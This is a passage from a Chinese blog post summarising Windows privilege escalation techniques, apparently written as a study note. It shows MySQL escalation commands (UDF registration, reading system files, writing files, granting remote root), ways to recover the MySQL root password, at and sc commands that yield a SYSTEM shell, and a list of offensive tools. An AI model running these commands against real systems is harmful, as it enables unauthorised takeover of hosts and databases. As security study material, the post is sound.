<h3 id="原理">原理</h3>
<p>主机A向主机B(访问<code>\\B</code>)进行SMB认证的时候，将&nbsp;<code>pszTargetName</code>&nbsp;设置为&nbsp;<code>cifs/B</code>&nbsp;,然后在<code>type 2</code>拿到主机B发送&nbsp;<code>Challenge</code>&nbsp;之后，在&nbsp;<code>lsass</code>&nbsp;里面缓存(&nbsp;<code>Challenge</code>&nbsp;,&nbsp;<code>cifs/B</code>&nbsp;)。</p>
<p>然后主机B在拿到主机A的type 3之后，会去&nbsp;<code>lsass</code>&nbsp;里面有没有缓存(&nbsp;<code>Challenge</code>&nbsp;,&nbsp;<code>cifs/b</code>&nbsp;)，如果存在缓存，那么认证失败。</p>
<p>这种情况底下，如果主机B和主机A是不同的主机的话，那&nbsp;<code>lsass</code>&nbsp;里面就不会缓存(<code>Challenge</code>,<code>cifs/B</code>)。如果是同一台主机的话，那&nbsp;<code>lsass</code>&nbsp;里面肯定有缓存，这个时候就会认证失败。</p>
<p>然而这个缓存(<code>Challenge</code>,<code>cifs/B</code>)是有时效性的，这个时间是<code>300</code>秒，也就是说300秒后，缓存(Challenge,cifs/B)就会被清空，这个时候即使主机A和主机B是同一台主机，那么由于缓存已经被清除，那么去&nbsp;<code>lsass</code>&nbsp;里面肯定找不到缓存(<code>Challenge</code>,&nbsp;<code>cifs/B</code>&nbsp;)。</p>
<p>具体过程可参考：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1560/#toc_cve-2019-1384_ghost-potato">内网渗透 – NTLM 反射分析及土豆家族</a></p>
<h1 id="0x09-数据库提权">0x09 数据库提权</h1>
<p>鉴于这个设计的内容挺多的，详情就看：本笔记的【Windows提权学习二】</p>
<p>下面做个简单介绍</p>
<p>在windows上经常会装这两个数据库</p>
<ol>
<li>sqlserver数据库提权</li>
<li>MySQL数据库提权</li>
</ol>
<p>所以直接针对这两个数据库进行提权。</p>
<h2 id="mysql提权">MySQL提权</h2>
<p>在利用mysql提权之前首先要回顾一下mysql的常用命令：</p>
<pre><code class="hljs scss">&gt; 查路径：select @<span class="hljs-keyword">@basedir</span> as basePath from dual

&gt; 查用户：select * from mysql.user

&gt; 注册函数：CREATE FUNCTION shell RETURNS STRING SONAME <span class="hljs-string">'udf.dll'</span>

&gt; 查版本：select version();

&gt; 导出：select <span class="hljs-built_in">load_file</span>(<span class="hljs-number">0</span>x633A5C5C626F6F742E696E69) FROM user into outfile 'D://a.txt<span class="hljs-string">'</span>
<span class="hljs-string"></span>
<span class="hljs-string">&gt; 写文件：select '</span><span class="hljs-string">' into outfile '</span>F://a.php<span class="hljs-string">';</span>
<span class="hljs-string"></span>
<span class="hljs-string">&gt; 开外连：GRANT ALL PRIVILEGES ON&nbsp;_._&nbsp;TO '</span>root<span class="hljs-string">'@'</span>%<span class="hljs-string">' IDENTIFIED BY '</span><span class="hljs-number">123456</span><span class="hljs-string">' WITH GRANT OPTION;</span>
<span class="hljs-string"></span>
<span class="hljs-string">&gt; 读文件：select load_file('</span>c:\boot.ini<span class="hljs-string">')</span>
<span class="hljs-string"></span>
<span class="hljs-string">&gt; 移动文件：select load_file('</span>C:/wmpub/nullevt.mof<span class="hljs-string">') into dumpfile '</span>c:/windows/system32/wbem/mof/nullevt.mof<span class="hljs-string">'</span></code></pre>
<h3 id="查找root密码">查找root密码</h3>
<p>利用mysql提权的三种方式均需要获取mysql数据库最高权限root的帐号密码。所以我们先讨论下如何获取mysql的root密码：</p>
<p>1.翻配置文件。关键字：config conn data sql inc database等</p>
<p>2.下载数据文件并破解密文。</p>
<p>root密码密文存放在：mysql数据库存储目录/mysq/user.myd中，低权限下可以用以下命令读取，或者直接使用暗月的“MYSQL低权限读取ROOT密码工具”，然后使用cmd5解密即可。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547469.png" alt></p>
<p>剩下的看【Windows提权学习二】</p>
<h2 id="mysql提权">Mysql提权</h2>
<p>见【Windows提权学习二】</p>
<h1 id="0x10-其他类型提权">0x10 其他类型提权</h1>
<h2 id="at命令提权">at命令提权</h2>
<p>在 Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以轻松将 Administrators 组下的用户权限提升到 SYSTEM</p>
<p>at 是一个发布定时任务计划的命令行工具，语法比较简单。通过 at 命令发布的定时任务计划， Windows 默认以 SYSTEM 权限运行。定时任务计划可以是批处理、可以是一个二进制文件。</p>
<h3 id="本地提权">本地提权</h3>
<pre><code class="hljs scss">语法：at 时间 命令
例子：at <span class="hljs-number">10</span>:<span class="hljs-number">45</span>PM calc.exe</code></pre>
<p>该命令会发布一个定时任务计划，在每日的 10:45 启动 calc.exe。我们可以通过 “/interactive”开启界面交互模式：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547470.png" alt></p>
<p>在得到一个system的cmd之后，使用 taskmgr 命令调用任务管理器，此时的任务管理器是system权限，然后kill掉explore进程，再使用任务管理器新建explore进程，将会得到一个system的桌面环境</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547471.png" alt></p>
<h3 id="配合msf提权">配合MSF提权</h3>
<p>msf下生成木马文件，at命令执行运行程序，上线后即为system</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121547472.png" alt></p>
<h2 id="sc命令提权">sc命令提权</h2>
<p>适用范围：windows 7/8、03/08、12/16</p>
<p>关于sc命令： SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> Create syscmd binPath= <span class="hljs-string">"cmd /K start"</span> <span class="hljs-built_in">type</span>= own <span class="hljs-built_in">type</span>= interact</code></pre>
<p>这个命令的意思是创建一个名叫 syscmd 的新的交互式的 cmd 服务，然后执行以下命令，就得到了一个system权限的cmd环境：</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> systcmd</code></pre>
<h1 id="0x11-常用工具">0x11 常用工具</h1>
<ul>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/itm4n/PrivescCheck">Windows 权限提升枚举脚本</a>：此脚本旨在识别通常由 Windows 配置问题或不良做法引起的<strong>本地权限提升</strong>(LPE) 漏洞。它还可以为某些漏洞利用和漏洞利用后任务收集有用的信息。</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/mertdas/PrivKit">PrivKit</a>：PrivKit 是一个简单的信标目标文件，可检测 Windows 操作系统上因配置错误而导致的权限提升漏洞。</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACME</a>：通过滥用内置的 Windows AutoElevate 后门来破坏 Windows 用户帐户控制。</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/SharpToken">SharpToken</a>：SharpToken是一个利用Token泄露的工具。它可以从系统中的所有进程中找到泄漏的Token并使用它们。如果你是低权限的服务用户，甚至可以用它升级到“NT AUTHORITY\SYSTEM”权限，并且无需目标用户的密码就可以切换到目标用户的桌面进行更多操作。</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG</a>：这个与上面Potato提权的工具不一样；另一个从服务帐户到系统的 Windows 本地权限提升</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/zcgonvh/DCOMPotato">DCOMPotato</a>：某些服务 DCOM 对象和 SeImpersonatePrivilege 滥用。</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/crisprss/RasmanPotato">RasmanPotato</a>：只是另一个土豆，就像其他土豆一样，使用 RasMan 服务进行权限升级；对于 Windows 10（11 未测试）、Windows Server 2012 - 2019（2022 未测试）</p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/decoder-it/LocalPotato">LocalPotato</a>：使用新的马铃薯技术的另一个本地 Windows 权限升级；）LocalPotato 攻击是一种针对本地身份验证的 NTLM 反射攻击。此攻击允许任意文件读/写和特权提升。</p>
</li>
</ul>
<h1 id="0x12-参考文章">0x12 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/254836.html">Windows常见提权总结</a><br>
<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12542?time__1311=GqGxuiD%3DiQemqGN4CxUxYu1CLDkbzDceboD#toc-6">关于Windows提权小结</a><br>
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/h1ck0r/p/17643783.html">Windows提权总结</a><br>
<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7776?time__1311=n4%2BxnD0DyDuAittqGNnmADRmwDkQNDc7in1oD#toc-6">Potato家族本地提权细节</a><br>
<a target="_blank" rel="noopener" href="https://forum.butian.net/share/860">Potato提权合集</a><br>
<a target="_blank" rel="noopener" href="https://www.geekby.site/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/#4-printspoofer-pipepotato-or-badpotato">Potato 家族提权分析</a><br>
<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/259256.html">史上最全windows提权手法总结，这都不看？</a><br>
<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/t325CBEdPZoSIVPAiUfpjQ">Windows 系统提权方式汇总</a><br>
<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2436657">Windows提权总结(超详细）</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/08/05/windows-ti-quan-zong-jie/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/08/05/windows-ti-quan-zong-jie/')">Windows提权总结</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/08/05/windows-ti-quan-zong-jie/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Windows提权总结&amp;url=http://hybcx.xyz/2024/08/05/windows-ti-quan-zong-jie/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/Windows%E6%8F%90%E6%9D%83/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Windows提权<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/02/thm-dai-ma-hun-yao-yuan-li/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-代码混淆原理</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/07/thm-qian-ming-gui-bi/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-签名规避</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/09/25/windows-ti-quan-xue-xi-er/" title="权限提升学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-09-25</div><div class="title">权限提升学习</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86"><span class="toc-number">1.1.</span> <span class="toc-text">Windows 权限划分</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%8F%90%E6%9D%83%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">0x02 提权信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E7%9A%84%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.</span> <span class="toc-text">获取系统安装的软件信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E8%A1%A5%E4%B8%81%E6%83%85%E5%86%B5"><span class="toc-number">2.3.</span> <span class="toc-text">获取系统补丁情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%B3%A8%E5%86%8C%E7%9A%84%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">2.4.</span> <span class="toc-text">获取系统注册的服务信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9C%A8%E7%BA%BF%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">2.5.</span> <span class="toc-text">获取在线主机信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E5%92%8C%E7%BB%84%E4%BF%A1%E6%81%AF"><span class="toc-number">2.6.</span> <span class="toc-text">收集本地用户和组信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%AC%E5%9C%B0%E5%85%B1%E4%BA%AB%E4%BF%A1%E6%81%AF"><span class="toc-number">2.7.</span> <span class="toc-text">获取本地共享信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96ip%E4%BF%A1%E6%81%AF"><span class="toc-number">2.8.</span> <span class="toc-text">获取IP信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE%E4%B8%8E%E8%BF%9E%E6%8E%A5%E4%BF%A1%E6%81%AF"><span class="toc-number">2.9.</span> <span class="toc-text">获取本地端口开放与连接信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.10.</span> <span class="toc-text">查看本地的计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%97%E5%87%BAiis%E7%9A%84%E7%AB%99%E7%82%B9"><span class="toc-number">2.11.</span> <span class="toc-text">列出iis的站点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E5%AD%98%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%89%80%E6%9C%89%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BF%A1%E6%81%AF"><span class="toc-number">2.12.</span> <span class="toc-text">保存系统上所有注册表信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF"><span class="toc-number">2.13.</span> <span class="toc-text">获取系统日志信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">0x03 系统内核溢出漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%9F%A5%E6%89%BE%E7%B3%BB%E7%BB%9F%E6%BD%9C%E5%9C%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">手动查找系统潜在漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E6%9F%A5%E6%89%BE%E7%B3%BB%E7%BB%9F%E6%BD%9C%E5%9C%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">自动查找系统潜在漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#windows-exploit-suggester"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">Windows Exploit Suggester</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#local_exploit_suggester-%E6%A8%A1%E5%9D%97"><span class="toc-number">3.2.1.</span> <span class="toc-text">local_exploit_suggester 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#enum_patches-%E6%A8%A1%E5%9D%97"><span class="toc-number">3.2.2.</span> <span class="toc-text">enum_patches 模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E6%BC%8F%E6%B4%9E%E5%B9%B6%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">选择漏洞并利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E7%B3%BB%E7%BB%9F%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">0x04 系统错误配置漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E4%BF%A1%E4%BB%BB%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.1.</span> <span class="toc-text">可信任服务路径漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.</span> <span class="toc-text">错误权限配置漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8powerupps1%E8%84%9A%E6%9C%AC"><span class="toc-number">4.2.1.</span> <span class="toc-text">1. 利用PowerUp.ps1脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-service_permissions-%E6%A8%A1%E5%9D%97"><span class="toc-number">4.2.2.</span> <span class="toc-text">2. service_permissions 模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE"><span class="toc-number">4.3.</span> <span class="toc-text">不安全的注册表权限配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AEalwaysinstallelevated"><span class="toc-number">4.4.</span> <span class="toc-text">注册表键AlwaysInstallElevated</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">4.5.</span> <span class="toc-text">自动安装配置文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E6%A8%A1%E5%9D%97"><span class="toc-number">4.5.1.</span> <span class="toc-text">MSF模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powerup%E7%9A%84%E6%A8%A1%E5%9D%97"><span class="toc-number">4.5.2.</span> <span class="toc-text">PowerUp的模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">4.6.</span> <span class="toc-text">计划任务</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">0x05 组策略首选项提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-number">5.1.</span> <span class="toc-text">相关知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sysvol"><span class="toc-number">5.1.1.</span> <span class="toc-text">SYSVOL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E5%81%8F%E5%A5%BDgpp"><span class="toc-number">5.1.2.</span> <span class="toc-text">组策略偏好GPP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell%E8%8E%B7%E5%8F%96cpassword"><span class="toc-number">5.2.</span> <span class="toc-text">powershell获取cpassword</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E8%8E%B7%E5%8F%96cpassword"><span class="toc-number">5.3.</span> <span class="toc-text">MSF获取cpassword</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">5.4.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E7%BB%95%E8%BF%87uac%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">0x06 绕过UAC提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="toc-number">6.1.</span> <span class="toc-text">基本知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E6%A8%A1%E5%9D%97%E5%88%A9%E7%94%A8"><span class="toc-number">6.2.</span> <span class="toc-text">MSF模块利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell%E8%84%9A%E6%9C%AC"><span class="toc-number">6.3.</span> <span class="toc-text">PowerShell脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">6.4.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">0x07 令牌窃取提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="toc-number">7.1.</span> <span class="toc-text">基本知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F-incognitoexe"><span class="toc-number">7.2.</span> <span 